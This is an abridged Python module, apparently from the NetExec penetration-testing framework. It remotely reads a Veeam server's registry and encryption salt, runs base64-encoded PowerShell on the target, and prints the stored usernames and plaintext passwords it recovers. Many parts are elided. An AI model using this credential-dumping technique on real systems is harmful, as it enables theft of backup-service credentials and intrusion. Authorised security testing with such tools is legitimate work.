...
class NXCModule:
    ...
    def __init__(self):
        ...
        with open(
            get_ps_script("veeam_dump_module/veeam_dump_postgresql.ps1")
        ) as psFile:
    ...
    def checkVeeamInstalled(self, context, connection):
                ...
                if database_config == "PostgreSql":
                    ...
                    PostgreSqlExec = (
                        rrp.hBaseRegQueryValue(
                            remoteOps._RemoteOperations__rrp, keyHandle, "Location"
                        )[1].split("\x00")[:-1][0]
                        + "\\bin\\psql.exe"
                    )
        ...
        if SqlDatabase and SqlInstance and SqlServer:
            ...
            credentials = self.executePsMssql(
                connection, SqlDatabase, SqlInstance, SqlServer, salt
            )
    ...
    def get_salt(self, context, remoteOps, regHandle):
        try:
            ...
            return rrp.hBaseRegQueryValue(
                remoteOps._RemoteOperations__rrp, keyHandle, "EncryptionSalt"
            )[1].split("\x00")[:-1][0]
        except DCERPCException as e:
            if str(e).find("ERROR_FILE_NOT_FOUND"):
    ...
    def executePsMssql(self, connection, SqlDatabase, SqlInstance, SqlServer, salt):
        self.psScriptMssql = self.psScriptMssql.replace(
            "REPLACE_ME_SqlDatabase", SqlDatabase
        )
        self.psScriptMssql = self.psScriptMssql.replace(
            "REPLACE_ME_SqlInstance", SqlInstance
        )
        self.psScriptMssql = self.psScriptMssql.replace(
            "REPLACE_ME_SqlServer", SqlServer
        )
        ...
        return connection.execute(
            f"powershell.exe -e {psScipt_b64} -OutputFormat Text", True
        )
    ...
    def executePsPostgreSql(
        ...
        self.psScriptPostgresql = self.psScriptPostgresql.replace(
            "REPLACE_ME_PostgreSqlExec", PostgreSqlExec
        )
        self.psScriptPostgresql = self.psScriptPostgresql.replace(
            "REPLACE_ME_PostgresUserForWindowsAuth", PostgresUserForWindowsAuth
        )
        self.psScriptPostgresql = self.psScriptPostgresql.replace(
            "REPLACE_ME_SqlDatabaseName", SqlDatabaseName
        )
        self.psScriptPostgresql = self.psScriptPostgresql.replace(
            "REPLACE_ME_b64Salt", salt
        )
        psScipt_b64 = b64encode(self.psScriptPostgresql.encode("UTF-16LE")).decode(
            "utf-8"
        )
    ...
    def printCreds(self, context, output):
        ...
        try:
            ...
            for account in output_stripped:
                ...
                description = (
                    description.strip().replace("WHITESPACE_ERROR", " ").strip()
                )
                context.log.highlight(f"{user:<40} {password:<40} {description}")
        except ValueError:
            context.log.fail(
                f"Powershell returned unexpected output: {output_stripped}"
            )
